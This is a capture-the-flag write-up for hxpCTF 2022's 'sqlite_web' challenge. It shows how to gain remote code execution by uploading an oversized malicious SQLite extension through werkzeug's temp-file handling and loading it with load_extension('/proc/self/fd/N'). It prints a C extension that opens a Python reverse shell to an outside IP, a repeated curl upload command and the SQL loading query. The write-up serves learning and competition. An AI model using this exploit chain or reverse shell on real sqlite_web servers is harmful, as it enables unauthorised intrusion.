---
title: sqlite_web - hxpCTF 2022
date: 2023-03-14 23:18:58
author: ma1f0y
author_url: https://twitter.com/mal_f0y
categories:
  - Web
tags:
  - hxpCTF
  
---

**tl;dr**

-  Create a sqlite3 extension with rce payload.
-  Abuse werkzeug tempfile to upload the extension to server.
-  load that extension using load_extension('/proc/self/fd/fd_no');


<!--more-->

**Challenge points**: 385
**No. of solves**: 17

Source: [download](https://2022.ctf.link/assets/files/sqlite_web-c910c710158cf245.tar.xz)

## Analysis

We were given the latest version of [sqlite_web](https://github.com/coleifer/sqlite-web) , our goal is to get RCE on the server. Looking through the Dockerfile we can see the sqlite_web is run using the following command :
```bash
sqlite_web encrypted.db -x -r -e ./crypto -H 0.0.0.0 -p 80
```
we have an encrypted.db loaded with all encrypted tables, and we also have a crypto extension from [sqlean](https://github.com/nalgeon/sqlean) loaded for using crypto functions like md5,sha1, etc.   

After setting up the challenge locally and reading sqlite_web source, we tried to find potential rce vectors in sqlite3 as we can execute SQL statements. We came accross this [blog](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/), which has a lot of tricks get rce using SQLite.

One thing we noticed was using `ATTACH DATABASE`  we can write files in to filesystem, thus we thought of overwriting an existing webapp's template file to insert a SSTI payload to get RCE but we couldn't execute multiple queries together so it was not possible to write into files and the database was also loaded using read-only mode.

Next thing we notice was using load_extension() function we can load an arbitrary extension and execute function inside that extension. But in the documentation of the [load_extension()](https://www.sqlite.org/lang_corefunc.html#load_extension) 

> For security reasons, extension loading is disabled by default and must be enabled by a prior call to sqlite3_enable_load_extension().

So we cannot call load_extension() until it is enabled by calling  sqlite3_enable_load_extension function. That's where loading the crypto module of this challenge comes into play. sqlite_web calls [dataset._database.load_extension(ext)](https://github.com/coleifer/sqlite-web/blob/72ae4bd921c996be85a95eb7a202d46f4a438701/sqlite_web/sqlite_web.py#L850-L853) while loading an extension. If we look into [peewee](https://github.com/coleifer/peewee/blob/4e18187428de3a3bdd29b6d399341c896730fc86/peewee.py#L3704) for load_extension function we can see these lines:
```python
def load_extension(self, extension):
        self._extensions.add(extension)
        if not self.is_closed():
            conn = self.connection()
            conn.enable_load_extension(True)
            conn.load_extension(extension)
```

So it enables the SQLite load_extension function for us. So  we can call the load_extension function with an arbitrary extension we provide. We tried to load the crypto.so on the server it worked, but we want to load our own extension file. 

Now the question is how can we upload a our own extension to the server? There is no file upload feature in the sqlite_web. At this point, I remembered the nigix trick from past hxp ctf, Where if the body of the request was too long it will store the body in a temp file, and we abuse that to get rce using include. We also have a similar scenario here so we checked for the same feature in [werkzeug](https://github.com/pallets/werkzeug/tree/2.2.x) which is used by Flask. 

Aaand we got what we wanted in [formparser.py](https://github.com/pallets/werkzeug/blob/2.2.x/src/werkzeug/formparser.py#L64-L70)!!
```python
    max_size = 1024 * 500

    if SpooledTemporaryFile is not None:
        return t.cast(t.IO[bytes], SpooledTemporaryFile(max_size=max_size, mode="rb+"))
    elif total_content_length is None or total_content_length > max_size:
        return t.cast(t.IO[bytes], TemporaryFile("rb+"))
```

werkzeug uses SpooledTemporaryFile from `tempfile` module to temporarily store uploaded file, and if the file sized is more than the specified max_size, it will create a temp file to store the data else it will store it in the memory itself.

Here in werkzeug we can see the max_size is specified as 500kb, so we just have to upload an extension file greater than 500kb to get that file on the server's filesystem.

## Exploit

First, we create a sqlite3 extension with rce payload in it . We modified the crypto extension from sqlean itself to spawn a reverse shell.

```c
int sqlite3_crypto_init(sqlite3* db, char** pzErrMsg, const sqlite3_api_routines* pApi) {
        system("python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('34.93.56.144',80));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/sh')\";");
        SQLITE_EXTENSION_INIT2(pApi);
        static const int flags = SQLITE_UTF8 | SQLITE_INNOCUOUS | SQLITE_DETERMINISTIC;
        sqlite3_create_function(db, "md5", 1, flags, (void*)5, sqlite3_hash, 0, 0);
        sqlite3_create_function(db, "sha1", 1, flags, (void*)1, sqlite3_hash, 0, 0);
        sqlite3_create_function(db, "sha256", -1, flags, (void*)2256, sqlite3_hash, 0, 0);
        sqlite3_create_function(db, "sha384", -1, flags, (void*)2384, sqlite3_hash, 0, 0);
        sqlite3_create_function(db, "sha512", -1, flags, (void*)2512, sqlite3_hash, 0, 0);
        sqlite3_create_function(db, "sqlean_version", 0, flags, 0, sqlean_version, 0, 0);
        return SQLITE_OK;
}
```
compile the code to create an extension file and make sure to add some garbage to make it more than 500kb.

Then we upload that file to the server by sending a fileupload request to `/table/import`

```bash
while true;
do 
curl http://94.130.178.227:18116/ctf/import -H "Authorization: Basic BASE64_TOKEN_HERE" -L -F file=@crypto.so;
done
```

Then we have to load that extension, we can't directly access the tempfile created but there will be a file descriptor of that file in ``/proc/self/fd`` directory until that request is finished ,so we can bruteforce the fd number and  load the extension.
And one more thing,at first we thought we can't load file without `.so` extension but later one of our team members figured out that it is not necessary if the file an actual so file. Then we saw that the sqlite was calling the init function of the extension using the file name, then we figured out that we can give the init function as the second parameter to the load_extension function. 

So the sql final query will be like this:

```sql    
SELECT load_extension('/proc/self/fd/$i','sqlite3_crypto_init')
```

After figuring out every part of the solution,we didn't have enough time to write a brute force script, but we had enough players to spam request to each fd manually to get it working before the ctf ends. 

flag
```
hxp{load_extension(r3m0t3_c0d3_3x3cut10n)}
```

## Closing thoughts

We had a lot of fun solving the challenge and learn't a lot from it, Thanks hxp for such a nice challenge and ctf.






